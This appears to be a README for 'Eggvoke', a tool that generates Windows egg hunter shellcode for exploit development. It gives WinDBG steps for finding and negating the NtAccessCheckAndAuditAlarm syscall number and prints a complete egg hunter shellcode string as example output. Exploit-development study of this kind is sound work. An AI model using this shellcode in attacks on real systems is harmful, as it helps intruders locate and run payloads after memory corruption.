# Eggvoke
Eggvoke is a program that will take your egg and the system call value and create egg hunter shellcode. The egg hunter used is very popular and widely used.

## How to use
To use Eggvoke it's pretty simple. You must first provide it two arguments on the command line. The first one is the value of the egg. This is what you have in your exploit and want to find. Next is the system call address you have. The script makes use of the `NtAccessCheckAndAuditAlarm` call and you will probably need to update the offset. I will show you a quick how-to when it comes to finding the new system call and converting it to something we can use. 

1. Go to WinDBG and run the command `u ntdll!NtAccessCheckAndAuditAlarm` this will and should provide you with the line `mov eax,1C6h` or similar where `1C6h` is our syscall.
2. To prevent any null bytes in the shell code we will do the following expression in WinDBG `? 0x00 - 0x1C6` which will give a negative number
3. Next to the number should be our hex value. We can put this hex value into our second argument

## Example Output
```
.------..------..------..------..------..------..------.
|E.--. ||G.--. ||G.--. ||V.--. ||O.--. ||K.--. ||E.--. |
| (\/) || :/\: || :/\: || :(): || :/\: || :/\: || (\/) |
| :\/: || :\/: || :\/: || ()() || :\/: || :\/: || :\/: |
| '--'E|| '--'G|| '--'G|| '--'V|| '--'O|| '--'K|| '--'E|
`------'`------'`------'`------'`------'`------'`------
--------------------------------------------------
 Developed by OracleOfMyst
--------------------------------------------------

[+] Egg       => oomm
[+] Hex       => 0x6d6d6f6f
[+] egghunter => ("\x66\x81\xca\xff\x0f\x42\x52\xb8\x3a\xfe\xff\xff\xf7\xd8\xcd\x2e\x3c\x05\x5a\x74\xeb\xb8\x6f\x6f\x6d\x6d\x89\xd7\xaf\x75\xe6\xaf\x75\xe3\xff\xe7")
```
